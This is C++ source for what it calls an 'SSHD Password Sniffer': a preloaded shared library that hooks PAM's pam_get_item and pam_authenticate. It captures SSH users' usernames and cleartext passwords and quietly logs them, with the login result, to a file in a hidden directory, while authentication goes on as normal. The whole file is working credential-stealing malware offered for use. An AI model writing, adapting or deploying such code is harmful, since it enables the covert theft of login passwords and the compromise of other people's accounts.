/**
 * SSHD Password Sniffer (userspace version)
 * Captures SSH password authentication on server side without root
 * Must be installed for SSH users
 */

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <security/pam_appl.h>
#include <chrono>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pwd.h>

// State machine states exactly as in the diagram
enum State {
    UNKNOWN,
    INITIALIZED,
    PASSWORD_SET,
    SUCCEEDED,
    FAILED
};

// Current state and authentication information
static State current_state = UNKNOWN;
static char username[256] = {0};
static char password[1024] = {0};
static bool auth_result = false;

// Pointers to original PAM functions
static int (*pam_get_item_orig)(const pam_handle_t *pamh, int item_type, const void **item) = NULL;
static int (*pam_authenticate_orig)(pam_handle_t *pamh, int flags) = NULL;

// Helper function to get user home directory
const char* get_home_dir() {
    // Try to get from env first
    const char* home = getenv("HOME");
    if (home) return home;
    
    // If not available (like in some SSH sessions), use passwd
    struct passwd* pw = getpwuid(getuid());
    if (pw) return pw->pw_dir;
    
    // Fallback
    return "/tmp";
}

// Generate log path in user's home directory
const char* get_log_path() {
    static char log_path[1024] = {0};
    if (log_path[0] == '\0') {
        snprintf(log_path, sizeof(log_path), "%s/.hidden/sshd_sniff.log", get_home_dir());
    }
    return log_path;
}

// Send the captured credentials to the log file
void send_credentials() {
    // Get current timestamp
    auto now = std::chrono::system_clock::now();
    std::time_t timestamp = std::chrono::system_clock::to_time_t(now);
    char time_str[100];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", localtime(&timestamp));
    
    // Create .hidden directory if it doesn't exist
    char hidden_dir[1024];
    snprintf(hidden_dir, sizeof(hidden_dir), "%s/.hidden", get_home_dir());
    mkdir(hidden_dir, 0700);
    
    // Open the log file
    FILE* log = fopen(get_log_path(), "a");
    if (log) {
        fprintf(log, "--- SSHD Credentials Captured ---\n");
        fprintf(log, "Time: %s\n", time_str);
        fprintf(log, "User: %s\n", username);
        fprintf(log, "Password: %s\n", password);
        fprintf(log, "Result: %s\n", auth_result ? "SUCCESS" : "FAILED");
        fprintf(log, "-----------------------------\n\n");
        fclose(log);
        
        // Set secure permissions
        chmod(get_log_path(), 0600);
    }
}

// Initialize the module
void initialize() {
    if (current_state != UNKNOWN) return;
    current_state = INITIALIZED;
    
    // For debugging only - comment out in production
    /*
    FILE* debug = fopen("/tmp/sshd_sniff_debug.log", "a");
    if (debug) {
        fprintf(debug, "SSHD module loaded, hooks set up (PID: %d)\n", getpid());
        fclose(debug);
    }
    */
}

// Hook for pam_get_item
extern "C" int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
    // Load the original function if needed
    if (!pam_get_item_orig) {
        pam_get_item_orig = (int(*)(const pam_handle_t*, int, const void**))dlsym(RTLD_NEXT, "pam_get_item");
        if (!pam_get_item_orig) return PAM_SYSTEM_ERR;
        initialize();
    }
    
    // Call the original function
    int result = pam_get_item_orig(pamh, item_type, item);
    
    // Capture password and username if this is the authentication token
    if (item_type == PAM_AUTHTOK && result == PAM_SUCCESS && *item != NULL) {
        // Get username
        const char *user = NULL;
        pam_get_item(pamh, PAM_USER, (const void**)&user);
        
        if (user) {
            strncpy(username, user, sizeof(username) - 1);
            username[sizeof(username) - 1] = '\0';
        }
        
        // Get password
        strncpy(password, (const char*)*item, sizeof(password) - 1);
        password[sizeof(password) - 1] = '\0';
        
        // Update state
        current_state = PASSWORD_SET;
    }
    
    return result;
}

// Hook for pam_authenticate
extern "C" int pam_authenticate(pam_handle_t *pamh, int flags) {
    // Load the original function if needed
    if (!pam_authenticate_orig) {
        pam_authenticate_orig = (int(*)(pam_handle_t*, int))dlsym(RTLD_NEXT, "pam_authenticate");
        if (!pam_authenticate_orig) return PAM_SYSTEM_ERR;
        initialize();
    }
    
    // Call the original function
    int result = pam_authenticate_orig(pamh, flags);
    
    // Process the result based on our state machine
    if (current_state == PASSWORD_SET) {
        auth_result = (result == PAM_SUCCESS);
        current_state = auth_result ? SUCCEEDED : FAILED;
        
        // Send the credentials to our log
        send_credentials();
    }
    
    return result;
}

// Constructor function - runs when the library is loaded
static __attribute__((constructor)) void init() {
    initialize();
}

// Destructor function - runs when the library is unloaded
static __attribute__((destructor)) void fini() {
    // Cleanup if needed
} 